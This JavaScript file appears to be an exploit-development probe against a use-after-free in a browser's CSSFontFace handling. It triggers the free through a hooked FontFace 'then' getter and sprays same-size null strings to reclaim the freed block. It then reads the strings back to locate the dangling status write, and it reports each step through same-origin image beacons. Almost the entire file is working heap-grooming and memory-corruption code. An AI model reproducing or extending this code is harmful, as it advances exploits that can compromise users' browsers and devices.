// p461-stringcanary — catch the m_status write in a JS-readable string
// Beacon prefix: V461-
//
// Established (docs/engineering/uaf-frame-analysis.md):
//   - The flip seen for weeks IS the dangling m_status = 3 write landing
//     in a rescuing CSSFontFace (FontFace construction claims the freed
//     block and heals the frame's post-free reads).
//   - Sprays that leave unhealable bytes in the block (arrays, nothing)
//     die; a reoccupant with a valid/zeroed TAIL is expected to survive.
//
// This probe puts a 176-char U+0000 string (16B header + 176B data = 192B,
// same bmalloc class as CSSFontFace) in the freed block:
//   - zero data  -> empty Vector/WeakHashSet, idle Timer: frame-safe
//   - m_status write (4 bytes: 03 00 00 00) lands mid-characters, so a
//     nonzero charCode read back from JS IS the write, and its index
//     measures offsetof(m_status) to the byte.
//
// Rungs: ff120 control (expect survive + flip) -> 8 strings -> 64 -> 256.
// Same attended skeleton as p460: one park per killer, no reloads, OOM
// guard, loop guard, freeze watchdog beacons without reloading.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V461-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  var PHASES = ['ff120', 's8', 's64', 's256'];
  var SN = { s8: 8, s64: 64, s256: 256 };
  var SLEN = 176;                       // 16 + 176 = 192-byte StringImpl
  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var ROUND_MS = 8000;

  function store(k, v) { try { localStorage.setItem(k, String(v)); } catch(e) {} }

  var ph = 0;
  try { ph = parseInt(localStorage.getItem('p461ph') || '0', 10); } catch(e) {}
  if (!(ph >= 0 && ph < PHASES.length)) ph = 0;

  var ran = 0;
  try { ran = parseInt(localStorage.getItem('p461ran') || '0', 10); } catch(e) {}
  if (ran === 1) {
    B('KILL-' + PHASES[ph]);
    ph = ph + 1;
    if (ph >= PHASES.length) { parkNow('ladder complete'); return; }
    store('p461ph', ph);
    store('p461ran', 0);
    parkNow('killer was ' + PHASES[ph - 1] + ' — back out, re-enter to continue');
    return;
  }

  var boots = 0;
  try {
    var t0 = parseInt(localStorage.getItem('p461bt') || '0', 10);
    var now = Date.now();
    if (now - t0 > 600000) boots = 1;
    else boots = (parseInt(localStorage.getItem('p461bc') || '0', 10) || 0) + 1;
    store('p461bt', now);
    store('p461bc', boots);
  } catch(e) {}
  if (boots > 10) { parkNow('loop guard — ' + boots + ' boots/10min'); return; }

  var hb = document.createElement('pre');
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var stopped = false;
  function parkNow(msg) {
    stopped = true;
    try {
      hb.textContent = 'p461 STOPPED: ' + msg;
      hb.style.color = '#ff0';
    } catch(e) {}
    B('PARK-' + encodeURIComponent(String(msg).slice(0, 60)));
  }

  B('BOOT-P' + ph + '-' + PHASES[ph] + '-b' + boots);

  var strings = [];
  var jfaces = [];
  var survThisPh = 0;

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        strings = [];
        jfaces = [];
        var n = SN[PHASES[ph]] || 0;
        try {
          if (PHASES[ph] === 'ff120') {
            for (var k = 0; k < 120; k++) {
              var ff = new FontFace('j' + k, BAD);
              document.fonts.add(ff);
              jfaces.push(ff);
            }
          } else {
            for (var i = 0; i < n; i++) {
              var s = '\u0000'.repeat(SLEN);
              s.charCodeAt(SLEN - 1);     // ensure flattened, keep alive
              strings.push(s);
            }
          }
        } catch (e) {
          B('OOMGUARD');
          parkNow('allocation failed — parked before any console error');
          return;
        }
      }
      return undefined;
    },
    configurable: true
  });

  function cleanup() {
    try {
      var st = document.querySelectorAll('style');
      for (var i = 0; i < st.length; i++) st[i].remove();
      document.fonts.forEach(function(f) { try { document.fonts.delete(f); } catch(e) {} });
    } catch(e) {}
    strings = [];
    jfaces = [];
  }

  function scanStrings() {
    var hits = [], total = 0;
    for (var i = 0; i < strings.length; i++) {
      var s = strings[i];
      if (s.length !== SLEN) { hits.push('LEN-s' + i + '=' + s.length); total++; continue; }
      for (var c = 0; c < SLEN; c++) {
        var v = s.charCodeAt(c);
        if (v !== 0) {
          if (hits.length < 4) hits.push('s' + i + '-c' + c + '-v' + v);
          total++;
        }
      }
    }
    return { hits: hits, total: total };
  }

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round() {
    if (stopped) return;
    hb.textContent = 'p461 P' + ph + ' (' + PHASES[ph] + ') round ' + (survThisPh + 1) + '/2';
    B('GO-P' + ph + '-' + PHASES[ph]);
    store('p461ran', 1);

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) {
      B('NOFACE-P' + ph);
      store('p461ran', 0);
      cleanup();
      setTimeout(round, ROUND_MS);
      return;
    }

    void face.loaded;
    face.load().then(
      function() {
        if (stopped) return;
        store('p461ran', 0);

        if (strings.length) {
          var r = scanStrings();
          if (r.total > 0) {
            // the write, caught: char index + 16 = offsetof(m_status)
            B('MARKER-' + r.hits.join('|'));
            B('TOTAL-' + r.total);
            hb.textContent = 'p461 WRITE CAUGHT: ' + r.hits.join(' ');
            hb.style.color = '#0ff';
            return;                        // keep strings alive; stop
          }
        }
        if (jfaces.length) {
          var flipped = -1;
          for (var k = 0; k < jfaces.length; k++) {
            var s;
            try { s = jfaces[k].status; } catch(e) { s = 'THROW'; }
            if (s !== 'unloaded') flipped = k;
          }
          B(flipped >= 0 ? 'FLIP-P' + ph + '-' + flipped : 'NOFLIP-P' + ph);
        }

        B('SURV-P' + ph + '-' + PHASES[ph]);
        cleanup();
        survThisPh++;
        if (survThisPh >= 2) {
          survThisPh = 0;
          ph = ph + 1;
          if (ph >= PHASES.length) { parkNow('ladder complete'); return; }
          store('p461ph', ph);
        }
        hb.textContent = 'p461 P' + ph + ' (' + PHASES[ph] + ') clean — next in 8s';
        setTimeout(round, ROUND_MS);
      },
      function() {
        if (stopped) return;
        store('p461ran', 0);
        B('NO0-P' + ph);
        cleanup();
        setTimeout(round, ROUND_MS);
      }
    );
  }

  round();
  setTimeout(function() {
    if (stopped) return;
    B('WATCHDOG-P' + ph + '-' + PHASES[ph]);
  }, 30000);
})();
